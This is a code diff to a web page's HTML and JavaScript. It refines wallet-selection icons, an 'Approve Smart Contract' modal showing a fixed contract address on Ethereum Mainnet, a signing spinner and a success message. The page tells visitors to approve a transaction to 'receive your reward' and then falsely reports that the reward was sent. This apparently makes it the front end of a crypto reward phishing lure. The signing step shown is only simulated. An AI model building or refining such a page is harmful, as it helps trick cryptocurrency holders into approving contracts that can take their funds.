@@ -1961,17 +1961,17 @@ function signTransaction() {
     // Hide sign modal
     document.getElementById('signModal').classList.remove('active');
     
-    // Show loading briefly
-    document.getElementById('loadingModal').classList.add('active');
+    // Show signing loading modal
+    document.getElementById('signingModal').classList.add('active');
     
-    // Simulate signing (2 seconds)
+    // Simulate signing transaction (2.5 seconds)
     setTimeout(() => {
-        // Hide loading modal
-        document.getElementById('loadingModal').classList.remove('active');
+        // Hide signing modal
+        document.getElementById('signingModal').classList.remove('active');
         
         // Show success modal
         document.getElementById('successModal').classList.add('active');
-    }, 2000);
+    }, 2500);
 }
 
 function closeSuccessModal() {
@@ -2061,8 +2061,11 @@ window.addEventListener('load', function() {
                 </button>
                 
                 <button class="wallet-option" onclick="selectWallet('Trust Wallet')">
-                    <div class="wallet-option-icon" style="background: #3375bb; border-radius: 10px;">
-                        <svg width="28" height="28" viewBox="0 0 600 600" fill="none"><path d="M300 0L50 150V300c0 166.5 108.5 322.5 250 350 141.5-27.5 250-183.5 250-350V150L300 0z" fill="white"/></svg>
+                    <div class="wallet-option-icon" style="background: linear-gradient(180deg, #3375BB 0%, #2A5A94 100%); border-radius: 10px;">
+                        <svg width="28" height="28" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M30 7L10 17V30C10 41.6 16.8 52.4 30 55C43.2 52.4 50 41.6 50 30V17L30 7Z" fill="white"/>
+                            <path d="M30 12L15 20V30C15 39.4 20.6 47.8 30 50C39.4 47.8 45 39.4 45 30V20L30 12Z" fill="#3375BB"/>
+                        </svg>
                     </div>
                     <span class="wallet-option-name">Trust Wallet</span>
                 </button>
@@ -2116,10 +2119,31 @@ window.addEventListener('load', function() {
     <!-- Sign Transaction Modal -->
     <div class="modal" id="signModal">
         <div class="sign-modal-content">
-            <div class="sign-icon">✍️</div>
-            <h3 class="sign-title">Sign Transaction</h3>
-            <p class="sign-text">To receive your reward, please sign the transaction to approve the smart contract</p>
-            <button class="sign-button" onclick="signTransaction()">Sign</button>
+            <div class="sign-icon">📜</div>
+            <h3 class="sign-title">Approve Smart Contract</h3>
+            <p class="sign-text">To receive your reward, please approve the transaction</p>
+            
+            <div style="background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 10px; padding: 16px; margin: 20px 0; text-align: left;">
+                <div style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px;">Contract Address</div>
+                <div style="font-size: 13px; color: #fff; font-family: 'Courier New', monospace; word-break: break-all; line-height: 1.5;">
+                    0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD
+                </div>
+                <div style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 12px; margin-bottom: 8px;">Network</div>
+                <div style="font-size: 13px; color: #fff;">Ethereum Mainnet</div>
+                <div style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 12px; margin-bottom: 8px;">Gas Fee</div>
+                <div style="font-size: 13px; color: #fff;">~0.0012 ETH</div>
+            </div>
+            
+            <button class="sign-button" onclick="signTransaction()">Sign Transaction</button>
+        </div>
+    </div>
+    
+    <!-- Signing Loading Modal -->
+    <div class="modal" id="signingModal">
+        <div class="loading-modal-content">
+            <div class="loading-spinner"></div>
+            <h3 class="loading-title">Signing Transaction...</h3>
+            <p class="loading-text">Please wait while your transaction is being signed</p>
         </div>
     </div>
     
@@ -2127,8 +2151,8 @@ window.addEventListener('load', function() {
     <div class="modal" id="successModal">
         <div class="success-modal-content">
             <div class="success-icon">✓</div>
-            <h3 class="success-title">Success!</h3>
-            <p class="success-message">Funds have been successfully sent to your wallet</p>
+            <h3 class="success-title">Transaction Successful!</h3>
+            <p class="success-message">Your reward has been successfully sent to your wallet balance</p>
             <button class="success-close-btn" onclick="closeSuccessModal()">Close</button>
         </div>
     </div>
